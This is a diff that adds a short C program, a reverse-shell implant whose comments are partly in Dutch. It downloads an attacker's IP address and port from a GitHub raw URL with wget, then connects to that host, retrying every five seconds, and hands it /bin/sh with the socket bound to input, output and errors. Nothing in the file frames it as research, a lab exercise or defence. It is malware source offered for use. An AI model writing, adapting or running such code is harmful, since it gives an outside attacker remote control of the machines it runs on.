@@ -1,0 +1,66 @@
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+int PORT;
+char *IP;
+int rshell(){
+    int socket_info;
+    int connecter;
+    int pid;
+    struct sockaddr_in sa;
+    while(1){
+        //soort socket, IPv4, poort nummer, aanvallers' IP.
+        socket_info = socket(AF_INET, SOCK_STREAM, 0);
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(PORT);
+    sa.sin_addr.s_addr = inet_addr(IP);
+    connecter = connect(socket_info, (struct sockaddr *)&sa, sizeof(struct sockaddr));
+        while(connecter < 0){
+                sleep(5);
+                connecter = connect(socket_info, (struct sockaddr *)&sa, sizeof(struct sockaddr));
+    }
+    connecter = write(socket_info,"Connected Successfully :) :) :)\n",36);
+    pid = fork();
+    if(pid > 0){
+                wait(NULL);
+        }
+        if(pid == 0){
+                dup2(socket_info,0); // input
+                dup2(socket_info,1); // output
+                dup2(socket_info,2); // errors
+                execl("/bin/sh", ">");
+        }
+
+}
+        return 0;
+
+}
+// -------------------------------------------  Get IP Port ---------------------------
+int getipport()
+{
+  FILE *fp;
+  char path[1035];
+  fp = popen("wget -qO- --no-check-certificate 'https://raw.githubusercontent.com/maddalakum/maddalakum.github.io/master/rev.txt'", "r");
+if (fp == NULL) { printf("Failed to run command\n" );  exit(1);  }
+while (fgets(path, sizeof(path)-1, fp) != NULL) {}
+char *p = strtok (path, "|");
+char *array[2];
+int i=0;
+while (p != NULL){array[i++] = p;p = strtok (NULL, "/");}
+IP=array[0];
+PORT=atoi(array[1]);;
+pclose(fp);
+return 0;
+}
+// ----------------------------------------------------------------------------------------
+int main(){
+getipport();
+rshell();
+}
